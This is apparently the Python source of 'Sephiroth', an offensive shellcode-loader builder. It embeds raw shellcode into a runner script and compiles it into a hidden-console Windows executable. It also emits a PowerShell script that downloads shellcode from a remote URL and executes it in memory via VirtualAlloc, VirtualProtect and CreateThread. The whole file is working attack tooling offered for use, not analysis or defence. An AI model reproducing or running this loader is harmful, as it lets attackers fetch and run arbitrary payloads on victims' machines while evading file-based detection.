import argparse
import colorama
import sys
import os
import random
from colorama import Fore, Style
import subprocess
import sys
import base64
import platform
def display_ansi_art(file_path):
    with open(file_path, 'r', encoding='latin-1') as file:
        ansi_art = file.read()
    print(ansi_art)

def create_exe(py_file):
    try:
       
        try:
            
            
            is_windows = platform.system().lower() == "windows"
            python_executable = "python" if is_windows else "python3"
            if platform.system().lower() != "windows":
                raise Exception("You need to compile in a Windows environment use -Pl to specify target Platforme .")
            nuitka_command = [
                python_executable, "-m", "nuitka",
                "--onefile",
                
                "--disable-console",
                "--standalone",
                "--remove-output",
                f"--output-dir=Output",
                f"--output-filename=Sephiroth",
                
                py_file
            ]
           
            
            
            subprocess.run(nuitka_command)
            
        except subprocess.CalledProcessError as e:
                print(f"Error in subprocess: {e}")


        print("windows Executable creation process completed.")
    except Exception as e:
        print(f"An error occurred: {e}")

def main():
    colorama.init(autoreset=True)  # Initialize colorama for Windows
    ans_directory = 'banners'
    spec= os.path.abspath(".")
    spec_files= [file for file in os.listdir(spec) if file.endswith('.spec')]
    ans_files = [file for file in os.listdir(ans_directory) if file.endswith('.ans')]
    if not ans_files:
        print("No .ans files found in the current directory.")
        return
    for file in spec_files:
        if file.endswith('.spec'):
            file_path = os.path.join(spec, file)
            os.remove(file_path)
            print(f"Deleted file: {file}")
    random_ans_file = os.path.join(ans_directory, random.choice(ans_files))
    display_ansi_art(random_ans_file)
    introduction = ( 
        Fore.LIGHTBLACK_EX + "Only Death Awaits Us All. But Do Not Fear. For It Is Only Through Death That We Are Truly Born \n"
        "Version: 1.0\n"
        "Author: ELMERIKH\n" + Style.RESET_ALL
    )
    print(introduction)
    ans_directory = 'banners'
    parser = argparse.ArgumentParser(description="Sephiroth")
    parser.add_argument("-url", "--Fileless", required=False, help="Fileless Shellcode loading")
    parser.add_argument("-sh", "--shellcode", required=False, help="Path of shellcode to embed")
    parser.add_argument("-ps", "--save_ps_command", required=False, action="store_true", help="save Fileless attack to ps1 script")

    args = parser.parse_args()
    if args.Fileless and args.shellcode:
        print("can only use one type ")
        sys.exit(1)
    if args.Fileless and not args.save_ps_command :
      
        input_arg = args.Fileless
        
            

        if  input_arg.startswith("http://") or input_arg.startswith("https://"):
           
            new_url = args.Fileless

            # Obfuscate the new URL
            obfuscated_url = new_url

            # Read the content of RunnerUrl.py and update the URL
            with open('RunnerUrl.py', 'r') as file:
                file_content = file.read()

            # Find the line containing 'static_url'
            lines = file_content.split('\n')
            updated_lines = []
            for line in lines:
                if 'static_url' in line:
                    parts = line.split('"')
                    if len(parts) >= 2:
                        parts[1] = obfuscated_url  # Update the URL with the obfuscated value
                        line = '"'.join(parts)
                updated_lines.append(line)
            

            # Write the updated content back to RunnerUrl.py
            updated_content = '\n'.join(updated_lines)
            with open('RunnerUrl.py', 'w') as file:
                file.write(updated_content)
            print("initiation phase done")
            subprocess.run("python RunnerUrl.py ")
            create_exe("exec.py")
        else:
            print("Bad Url")
            print("\nUsage: python sephiroth.py -url <url>")
            sys.exit(1)
    if args.shellcode:
        try:
            with open(args.shellcode, 'rb') as f_in:
              bx = f_in.read()
            
            with open('Runner.py', 'r') as file:
                lines = file.readlines()

            for i, line in enumerate(lines):
                if 'b_x = b"' in line:
                    bx = bx.hex()

                    bx = "\\x" + "\\x".join(bx[i:i + 2] for i in range(0, len(bx), 2))


                    lines[i] = '    b_x = b"'  +  bx + '"\n'  

            with open('Runner.py', 'w') as file:
                file.writelines(lines)
            print("initiation phase done")
            create_exe("Runner.py")
        except Exception as e:
            print("Error executing :", e)

    if args.save_ps_command and args.Fileless:
        ps_file_path = os.path.join("Output", "Sephiroth.ps1")
        with open(ps_file_path, 'w') as ps_file:
            url = args.Fileless
    
            ps_file.write(f"""Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;

public class ReflectiveLoader
{{
    [DllImport("kernel32.dll", SetLastError=true, ExactSpelling=true)]
    static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

    [DllImport("kernel32.dll", SetLastError=true, ExactSpelling=true)]
    static extern bool VirtualProtect(IntPtr lpAddress, uint dwSize, uint flNewProtect, out uint lpflOldProtect);

    [DllImport("kernel32.dll", SetLastError=true, ExactSpelling=true)]
    static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

    [DllImport("kernel32.dll")]
    static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);

    public static void Inject(byte[] shellcode)
    {{
        IntPtr baseAddr = VirtualAlloc(IntPtr.Zero, (uint)shellcode.Length, 0x00001000, 0x40);
        Marshal.Copy(shellcode, 0, baseAddr, shellcode.Length);

        uint oldProtect;
        VirtualProtect(baseAddr, (uint)shellcode.Length, 0x20, out oldProtect);

        IntPtr hThread = CreateThread(IntPtr.Zero, 0, baseAddr, IntPtr.Zero, 0, IntPtr.Zero);
        WaitForSingleObject(hThread, 0xFFFFFFFF);
    }}
}}
"@

# URL to fetch the shellcode from
$url = "{url}"

# Fetch the content from the URL
$shellcodeBytes = [System.Net.WebClient]::new().DownloadData($url)

# Convert byte array to hexadecimal string
$hexShellcode = [System.BitConverter]::ToString($shellcodeBytes) -replace '-'

# Convert hexadecimal string to byte array
$shellcode = [System.Linq.Enumerable]::Range(0, $hexShellcode.Length / 2) | ForEach-Object {{ [Convert]::ToByte($hexShellcode.Substring($_ * 2, 2), 16) }}

# Inject the shellcode
[ReflectiveLoader]::Inject($shellcode)
 
""")
        print('\n')
        print('generated  Powershell script')
        print('\n')
        print(f"PowerShell command saved to: {ps_file_path}")
        return

if __name__ == "__main__":
    main()
    
        